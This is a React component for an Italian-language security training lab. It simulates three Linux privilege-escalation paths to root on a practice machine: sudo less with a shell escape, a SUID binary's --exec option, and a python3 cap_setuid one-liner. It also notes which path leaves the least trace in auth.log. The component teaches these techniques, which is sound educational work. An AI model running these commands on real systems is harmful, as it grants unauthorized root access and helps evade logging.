import { useState } from "react";
import { KeyRound, ShieldCheck, TerminalSquare } from "lucide-react";
import { Button } from "@/components/ui/button";
import { InfoNote, SuccessNote } from "@/components/lab/Feedback";
import { cn } from "@/lib/utils";
import type { TaskContext } from "../../types";

type PathId = "less" | "reader" | "python";

const PATHS: Record<PathId, {
  title: string;
  icon: typeof KeyRound;
  clue: string;
  steps: string[];
  outcome: string;
}> = {
  less: {
    title: "Sudo NOPASSWD su less",
    icon: KeyRound,
    clue: "sudo -l  →  (ALL) NOPASSWD: /usr/bin/less",
    steps: [
      "$ sudo less /etc/hosts",
      "  … apre less come root …",
      "  :!sh",
      "# whoami",
      "root",
    ],
    outcome: "Una riga sola: less permette di lanciare shell interne. Con sudo dietro, quella shell è root.",
  },
  reader: {
    title: "SUID custom /usr/local/bin/reader",
    icon: TerminalSquare,
    clue: "ls -la /usr/local/bin/reader  →  -rwsr-xr-x 1 root root",
    steps: [
      "$ /usr/local/bin/reader --help",
      "  reader v1.2 — --exec CMD  esegue CMD",
      "$ /usr/local/bin/reader --exec /bin/bash",
      "# id",
      "uid=0(root) gid=0(root) groups=0(root)",
    ],
    outcome: "Il binario custom aveva un'opzione --exec non filtrata: girando SUID, esegue bash come root.",
  },
  python: {
    title: "Capability cap_setuid su python3",
    icon: ShieldCheck,
    clue: "getcap -r / 2>/dev/null  →  /usr/bin/python3 cap_setuid+ep",
    steps: [
      "$ python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
      "# whoami",
      "root",
    ],
    outcome: "L'interprete con cap_setuid può cambiare il proprio uid a 0 senza alcun controllo: shell root immediata.",
  },
};

export default function Task09Lab({ markComplete, isComplete }: TaskContext) {
  const [seen, setSeen] = useState<PathId[]>([]);
  const [active, setActive] = useState<PathId | null>(null);

  const open = (id: PathId) => {
    setActive(id);
    setSeen((s) => {
      if (s.includes(id)) return s;
      const next = [...s, id];
      if (next.length === 1) markComplete(); // basta averne provata almeno una
      return next;
    });
  };

  return (
    <div>
      <div className="min-w-0 rounded-xl border border-border bg-surface p-4">
        <p className="mb-2 font-mono text-[11px] uppercase tracking-widest text-accent">Enumerazione su lab01</p>
        <p className="break-words text-xs leading-relaxed text-muted-foreground">
          Sei l'utente <span className="font-mono text-foreground">alex</span>. Hai raccolto tre
          indizi diversi. Scegli una via — o provale tutte, ognuna porta a root in modo differente.
        </p>
      </div>

      <div className="mt-3 grid min-w-0 gap-3 md:grid-cols-3">
        {(Object.keys(PATHS) as PathId[]).map((id) => {
          const p = PATHS[id];
          const Icon = p.icon;
          const opened = seen.includes(id);
          const isActive = active === id;
          return (
            <button
              key={id}
              onClick={() => open(id)}
              className={cn(
                "min-w-0 rounded-xl border p-4 text-left transition active:scale-[0.98]",
                isActive
                  ? "border-accent bg-accent/10"
                  : opened
                    ? "border-success/50 bg-success/5"
                    : "border-border bg-surface hover:border-accent/50",
              )}
            >
              <span className="grid h-10 w-10 place-items-center rounded-lg border border-accent/40 bg-accent/10 text-accent">
                <Icon className="h-5 w-5" />
              </span>
              <p className="mt-3 break-words text-sm font-medium text-foreground">{p.title}</p>
              <p className="mt-1 break-all font-mono text-[10px] text-muted-foreground">{p.clue}</p>
            </button>
          );
        })}
      </div>

      {active && (
        <div className="mt-4 min-w-0 overflow-hidden rounded-xl border border-border bg-black">
          <div className="border-b border-border/60 bg-surface-2 px-3 py-2 font-mono text-[11px] text-muted-foreground">
            simulazione — {PATHS[active].title}
          </div>
          <pre className="min-w-0 whitespace-pre-wrap break-words [overflow-wrap:anywhere] p-3 font-mono text-[11px] text-ivory/90">
{PATHS[active].steps.join("\n")}
          </pre>
          <p className="border-t border-border/60 bg-surface p-3 text-xs text-muted-foreground">{PATHS[active].outcome}</p>
        </div>
      )}

      <div className="mt-3 flex flex-wrap items-center gap-3">
        <span className="text-xs text-muted-foreground">
          Vie provate: {seen.length}/3
        </span>
        {seen.length < 3 && active && (
          <Button variant="outline" onClick={() => setActive(null)}>Prova un'altra via</Button>
        )}
      </div>

      {!isComplete && (
        <InfoNote>
          Ogni indizio porta a root in modo diverso: less via sudo, reader via SUID custom, python
          via capability. Apri almeno una scheda per completare — ma ti consiglio di aprirle tutte.
        </InfoNote>
      )}
      {isComplete && (
        <SuccessNote>
          Hai portato a termine una scalata reale scegliendo tu la strada. Le tre vie sono
          equivalenti nel risultato (root) ma diverse nel rumore che generano: less lascia una
          traccia in auth.log via sudo, reader nessuna se non gira come utente diverso, python è la
          più silenziosa.
        </SuccessNote>
      )}
    </div>
  );
}
